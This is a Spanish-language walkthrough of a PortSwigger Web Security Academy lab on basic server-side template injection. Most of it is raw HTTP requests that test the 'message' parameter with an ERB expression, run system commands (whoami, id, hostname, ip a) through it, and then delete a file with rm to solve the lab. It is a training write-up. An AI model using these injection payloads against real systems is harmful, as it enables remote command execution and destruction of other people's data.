---
description: >-
  https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic
---

# Lab 1: Basic server-side template injection

Se inicia el laboratorio y al interactuar con ver los detalles del primer producto, se genera la siguiente peticion:

```
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2
Host: 0a1800fb0372743b825dbaa000200070.web-security-academy.net
Cookie: session=c4ZZ1PuyIiXEyqlJ6qEAaJPFuzLeNZ6y
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Referer: https://0a1800fb0372743b825dbaa000200070.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior responde asi:

```html
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 10619

<!DOCTYPE html>
Unfortunately this product is out of stock
```

El parametro message es vulnerable a SSTI:

```
GET /?message=<%=+7*7+%> HTTP/2
Host: 0a1800fb0372743b825dbaa000200070.web-security-academy.net
Cookie: session=c4ZZ1PuyIiXEyqlJ6qEAaJPFuzLeNZ6y
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Referer: https://0a1800fb0372743b825dbaa000200070.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

La respuesta de la peticion entrega realiza el calculo matematico indicando que la respuesta es 49:

Por lo anterior, podemos afirmar que es vulnerable a SSTI:

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Teniendo en cuenta lo anterior, podemos utilizar la palabra reservada system para ejecutar comandos:

```
GET /?message=<%=+system("whoami;id;hostname;ip+a+show")+%> HTTP/2
Host: 0a1800fb0372743b825dbaa000200070.web-security-academy.net
Cookie: session=c4ZZ1PuyIiXEyqlJ6qEAaJPFuzLeNZ6y
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Referer: https://0a1800fb0372743b825dbaa000200070.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

Lo anterior da como resultado:

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

Para resolver el laboratorio enviamos la siguiente peticion:

```
GET /?message=<%=+system("rm+/home/carlos/morale.txt")+%> HTTP/2
Host: 0a1800fb0372743b825dbaa000200070.web-security-academy.net
Cookie: session=c4ZZ1PuyIiXEyqlJ6qEAaJPFuzLeNZ6y
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: es-CO
Referer: https://0a1800fb0372743b825dbaa000200070.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```
